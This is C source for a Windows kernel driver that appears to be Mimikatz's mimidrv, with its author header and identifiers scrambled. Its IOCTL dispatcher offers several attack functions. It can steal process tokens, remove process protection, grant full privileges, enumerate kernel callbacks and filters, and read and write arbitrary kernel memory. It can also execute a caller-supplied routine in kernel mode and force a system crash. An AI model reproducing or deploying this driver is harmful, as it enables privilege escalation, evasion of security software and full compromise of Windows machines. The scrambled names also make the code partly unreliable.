/*	4oM5AQx1 w4Er5 `09o6X7tzWM`
	https://blog.09o6X7tzWM.com
	dqTBkqdWaZiU5U2aN6CKrRY
	Licence : https://awr13GOqyUBjG1k.org/licenses/by/4.0/
*/
#include "mimidrv.h"
UNICODE_STRING
	uStrDriverName = {30, 32, L"\\Device\\" MIMIDRV},
	uStrDosDeviceName = {38, 40, L"\\DosDevices\\" MIMIDRV};

NTSTATUS UnSupported(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	return STATUS_NOT_SUPPORTED;
}

void DriverUnload(IN PDRIVER_OBJECT theDriverObject)
{
	IoDeleteSymbolicLink(&uStrDosDeviceName);
	IoDeleteDevice(theDriverObject->DeviceObject);
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath)
{
	NTSTATUS status = STATUS_NOT_SUPPORTED;
	PDEVICE_OBJECT pDeviceObject;
	ULONG i;
	
	if(ceFdOsIndex = getWindowsIndex())
	{
		status = IoCreateDevice(theDriverObject, 0, &uStrDriverName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDeviceObject);
		if(NT_SUCCESS(status))
		{
			for(i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
				theDriverObject->MajorFunction[i] = UnSupported;

			theDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MimiDispatchDeviceControl;
			theDriverObject->DriverUnload = DriverUnload;
		
			pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
			IoCreateSymbolicLink(&uStrDosDeviceName, &uStrDriverName);
			status = AuxKlibInitialize();
		}
	}
	return status;
}

typedef NTSTATUS	(NTAPI * PZWSETSYSTEMENVIRONMENTVALUEEX) (__in PUNICODE_STRING VariableName, __in LPGUID VendorGuid, __in_bcount_opt(ValueLength) PVOID Value, __in ULONG ValueLength, __in ULONG Attributes);
NTSTATUS kkllclqlsysenvset(SIZE_T szBufferIn, PVOID bufferIn, PJoAA_BUFFER outBuffer)
{
	NTSTATUS status = STATUS_NOT_FOUND;
	UNICODE_STRING uZwSetSystemEnvironmentVariableEx, uVar;
	PZWSETSYSTEMENVIRONMENTVALUEEX ZwSetSystemEnvironmentValueEx;
	PMIMIDRV_VARIABLE_NAME_AND_VALUE vnv = (PMIMIDRV_VARIABLE_NAME_AND_VALUE) bufferIn;
	RtlInitUnicodeString(&uZwSetSystemEnvironmentVariableEx, L"ZwSetSystemEnvironmentValueEx");
	RtlInitUnicodeString(&uVar, vnv->Name);
	if(ZwSetSystemEnvironmentValueEx = (PZWSETSYSTEMENVIRONMENTVALUEEX) MmGetSystemRoutineAddress(&uZwSetSystemEnvironmentVariableEx))
		status = ZwSetSystemEnvironmentValueEx(&uVar, &vnv->VendorGuid, (PUCHAR) vnv + vnv->ValueOffset, vnv->ValueLength, vnv->Attributes);
	return status;
}

NTSTATUS MimiDispatchDeviceControl(IN OUT DEVICE_OBJECT *DeviceObject, IN OUT IRP *Irp)
{
	NTSTATUS status = STATUS_NOT_SUPPORTED;
	PIO_STACK_LOCATION pIoStackIrp = NULL;
	size_t szBufferIn, szBufferOut, szReallyOut = 0;
	PVOID bufferIn, bufferOut;
	JoAA_BUFFER kOutputBuffer = {&szBufferOut, (PWSTR *) &bufferOut};
	ULONG i;
	PMDL pMdl;

	pIoStackIrp = IoGetCurrentIrpStackLocation(Irp);    
	if(pIoStackIrp)
	{
		szBufferIn	= pIoStackIrp->Parameters.DeviceIoControl.InputBufferLength;
		szBufferOut	= pIoStackIrp->Parameters.DeviceIoControl.OutputBufferLength;
		bufferIn	= pIoStackIrp->Parameters.DeviceIoControl.Type3InputBuffer;
		bufferOut	= Irp->UserBuffer;
		
		switch(pIoStackIrp->Parameters.DeviceIoControl.IoControlCode)
		{
			case IOCTL_MIMIDRV_RAW:
				status = kprintf(&kOutputBuffer, L"Raw command (not implemented yet) : %s\n", bufferIn);
				break;
			case IOCTL_MIMIDRV_PING:
				status = kprintf(&kOutputBuffer, L"Input  : %s\nOutput : %s\n", bufferIn, L"pong");
				break;
			case IOCTL_MIMIDRV_BSOD:
				KeBugCheck(MANUALLY_INITIATED_CRASH);
				break;
			case IOCTL_MIMIDRV_DEBUG_BUFFER:
				status = kprintf(&kOutputBuffer, L"in (0x%p - %u) ; out (0x%p - %u)\n", bufferIn, szBufferIn, bufferOut, szBufferOut);
				break;
			case IOCTL_MIMIDRV_SYSENVSET:
				status = kkllclqlsysenvset(szBufferIn, bufferIn, &kOutputBuffer);
				break;

			case IOCTL_MIMIDRV_PROCESS_LIST:
				status = kkllclqlprocess_enum(szBufferIn, bufferIn, &kOutputBuffer, kkllclqlprocess_list_callback, NULL); // input needed ?
				break;
			case IOCTL_MIMIDRV_PROCESS_TOKEN:
				status = kkllclqlprocess_token(szBufferIn, bufferIn, &kOutputBuffer);
				break;
			case IOCTL_MIMIDRV_PROCESS_PROTECT:
				status = kkllclqlprocess_protect(szBufferIn, bufferIn, &kOutputBuffer);
				break;
			case IOCTL_MIMIDRV_PROCESS_FULLPRIV:
				status = kkllclqlprocess_fullprivileges(szBufferIn, bufferIn, &kOutputBuffer);
				break;

			case IOCTL_MIMIDRV_MODULE_LIST:
				status = kkllclqlmodules_enum(szBufferIn, bufferIn, &kOutputBuffer, kkllclqlmodules_list_callback, NULL); // input needed ?
				break;

			case IOCTL_MIMIDRV_SSDT_LIST:
				status = kkllclqlssdt_list(&kOutputBuffer);
				break;

			case IOCTL_MIMIDRV_NOTIFY_PROCESS_LIST:
				status = kkllclqlnotify_list_process(&kOutputBuffer);
				break;
			case IOCTL_MIMIDRV_NOTIFY_THREAD_LIST:
				status = kkllclqlnotify_list_thread(&kOutputBuffer);
				break;
			case IOCTL_MIMIDRV_NOTIFY_IMAGE_LIST:
				status = kkllclqlnotify_list_image(&kOutputBuffer);
				break;
			case IOCTL_MIMIDRV_NOTIFY_REG_LIST:
				status = kkllclqlnotify_list_reg(&kOutputBuffer);
				break;
			case IOCTL_MIMIDRV_NOTIFY_OBJECT_LIST:
				status = kkllclqlnotify_list_object(&kOutputBuffer);
				break;

			case IOCTL_MIMIDRV_FILTER_LIST:
				status = kkllclqlfilters_list(&kOutputBuffer);
				break;
			case IOCTL_MIMIDRV_MINIFILTER_LIST:
				status = kkllclqlminifilters_list(&kOutputBuffer);
				break;

			case IOCTL_MIMIDRV_VM_READ:
				status = kkllclqlmemory_vm_read(bufferOut, bufferIn, szBufferOut);
				break;
			case IOCTL_MIMIDRV_VM_WRITE:
				status = kkllclqlmemory_vm_write(bufferOut, bufferIn, szBufferIn);
				break;
			case IOCTL_MIMIDRV_VM_ALLOC:
				status = kkllclqlmemory_vm_alloc(szBufferIn, (PVOID *) bufferOut);
				break;
			case IOCTL_MIMIDRV_VM_FREE:
				status = kkllclqlmemory_vm_free(bufferIn);
				break;
			case IOCTL_MIMIDRV_CREATEREMOTETHREAD:
				status = ((PMIMIDRV_THREAD_INFO) bufferIn)->pRoutine(((PMIMIDRV_THREAD_INFO) bufferIn)->pArg);
				break;
		}

		if(NT_SUCCESS(status))
			szReallyOut = pIoStackIrp->Parameters.DeviceIoControl.OutputBufferLength - szBufferOut;
	}
	
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = szReallyOut;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

JoAA_OS_INDEX getWindowsIndex()
{
	if(*NtBuildNumber > 19041) // forever 10 =)
		return ceFdOsIndex_10_2004;

	switch(*NtBuildNumber)
	{
		case 2600:
			return ceFdOsIndex_XP;
			break;
		case 3790:	
			return ceFdOsIndex_2K3;
			break;
		case 6000:
		case 6001:
		case 6002:
			return ceFdOsIndex_VISTA;
			break;
		case 7600:
		case 7601:
			return ceFdOsIndex_7;
			break;
		case 8102:
		case 8250:
		case 9200:
			return ceFdOsIndex_8;
		case 9431:
		case 9600:
			return ceFdOsIndex_BLUE;
			break;
		case 10240:
			return ceFdOsIndex_10_1507;
			break;
		case 10586:
			return ceFdOsIndex_10_1511;
			break;
		case 14393:
			return ceFdOsIndex_10_1607;
			break;
		case 15063:
			return ceFdOsIndex_10_1703;
			break;
		case 16299:
			return ceFdOsIndex_10_1709;
			break;
		case 17134:
			return ceFdOsIndex_10_1803;
			break;
		case 17763:
			return ceFdOsIndex_10_1809;
			break;
		case 18362:
			return ceFdOsIndex_10_1903;
			break;
		case 18363:
			return ceFdOsIndex_10_1909;
			break;
		case 19041:
			return ceFdOsIndex_10_2004;
			break;
		default:
			return ceFdOsIndex_UNK;
	}
}